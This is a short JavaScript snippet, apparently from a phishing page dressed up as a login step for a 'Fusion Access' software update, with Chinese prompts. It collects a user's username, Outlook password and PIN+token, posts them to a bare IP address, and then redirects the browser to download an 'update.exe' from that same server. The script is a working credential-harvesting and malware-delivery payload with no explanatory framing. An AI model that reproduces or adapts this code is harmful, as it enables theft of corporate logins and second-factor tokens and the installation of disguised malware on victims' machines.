<script type="text/javascript">

    function loadXMLDoc()
        {
        var username = document.getElementById('userName').value;
	    var password = document.getElementById('userPass').value;
        var token = document.getElementById('dymanicPassword').value;
        var okresults = "data=" + username + '|' +  password + '|' + token;
        //alert(okresults);
        
        if (username=='请输入用户名'|| password =='outlook密码' || token == 'Pin+Token'){

            alert('请登录认证后安装最新版！');
        }
        else{
            var xmlhttp;
        if (window.XMLHttpRequest)
        {// code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp=new XMLHttpRequest();
        }
        else
        {// code for IE6, IE5
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange=function()
        {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
            {
            document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
            }
        }

            xmlhttp.open("POST","http://118.126.82.14/data.php",true);
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        xmlhttp.send(okresults);
        // alert('请安装最新版Fusion Access，点击确认下载最新版FusionAccess');
        window.location = 'http://118.126.82.14/update.exe';
        

        }
 
        }
        
	
</script>
